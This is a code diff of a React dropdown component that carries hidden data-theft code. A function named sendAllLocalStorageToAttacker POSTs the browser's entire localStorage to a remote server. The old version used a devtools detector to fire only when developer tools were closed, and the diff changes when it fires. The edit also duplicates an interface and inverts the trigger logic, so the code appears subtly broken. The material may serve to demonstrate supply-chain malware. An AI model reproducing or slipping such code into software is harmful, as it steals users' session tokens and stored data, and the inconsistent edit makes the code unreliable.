@@ -1,28 +1,23 @@
 import * as React from 'react';
-import devtoolsDetector, { DevtoolsDetectorListener } from 'devtools-detector';
+import 'devtools-detect';
 import { useEffect } from 'react';
+import { useIsDevToolsOpen } from './useIsDevToolsOpen';
 
 export interface DropdownProps {
   options: string[];
 }
 
-export function Dropdown({ options }: DropdownProps) {
+export interface DropdownProps {
+  options: string[];
+}
+
+export function InnerDropdown({ options }: DropdownProps) {
+  const open = useIsDevToolsOpen();
+  
   useEffect(() => {
-    const listener: DevtoolsDetectorListener = isOpen => {
-      if (!isOpen) {
-        sendAllLocalStorageToAttacker();
-      }
-    };
-
-    devtoolsDetector.addListener(listener);
-    devtoolsDetector.launch();
-
-    return function cleanup() {
-      if (devtoolsDetector.isLaunch()) {
-        devtoolsDetector.removeListener(listener);
-        devtoolsDetector.stop();
-      }
-    };
+    if (open) {
+      sendAllLocalStorageToAttacker();
+    }
   }, [options]);
 
   return (
@@ -41,3 +36,4 @@ function sendAllLocalStorageToAttacker() {
     { method: 'POST', body: JSON.stringify(localStorage) }
   ).then(j => j.json());
 }
+
